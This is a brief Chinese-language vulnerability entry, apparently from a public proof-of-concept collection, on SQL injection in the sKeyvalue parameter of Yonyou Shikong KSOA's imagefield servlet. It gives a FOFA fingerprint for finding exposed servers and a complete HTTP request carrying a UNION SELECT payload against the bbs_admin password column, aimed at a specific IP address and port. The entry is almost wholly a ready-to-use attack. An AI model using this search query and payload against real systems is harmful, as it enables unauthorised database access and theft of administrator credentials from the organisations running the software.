# 用友时空 KSOA servlet imagefield 文件 sKeyvalue 参数 SQL 注入漏洞

    ## fofa

```
body="onmouseout=\"this.classname='btn btnOff'\""
```

## poc

```
GET /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+ HTTP/1.1
Host: 1.192.90.153:1111
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip


```
